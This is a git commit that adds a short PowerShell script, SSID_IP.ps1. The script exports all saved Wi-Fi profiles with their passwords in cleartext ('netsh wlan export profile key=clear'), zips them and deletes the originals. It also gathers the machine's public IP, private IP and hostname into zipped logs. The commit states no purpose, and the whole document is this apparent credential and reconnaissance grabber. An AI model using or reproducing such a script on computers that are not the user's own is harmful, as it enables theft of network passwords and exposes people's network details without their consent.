65dbfe3b79b64bc3f8f1d9d25c8a16bb7cb4846f
Fonta22 <paufontasp@gmail.com>
2022-09-21 09:42:23 +0200

    Initial commit

---
+++ SSID_IP.ps1
@@ -0,0 +1,15 @@
+$IP_Zip = "IP_Addresses.zip"
+$SSID_Zip = "SSID_Profiles.zip"
+
+netsh wlan export profile key=clear
+Compress-Archive -U -Path .\*.xml -DestinationPath $SSID_Zip
+rm .\*.xml
+
+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content | Out-File -FilePath .\Public.log
+
+$Private = (Get-NetIPAddress | Where-Object {$_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00"}).IPAddress
+$Private | Out-File -FilePath .\Private.log
+
+[System.Net.Dns]::GetHostByAddress($Private).Hostname | Out-File -FilePath .\HostName.log
+
+Compress-Archive -U -Path .\*.log -DestinationPath $IP_Zip
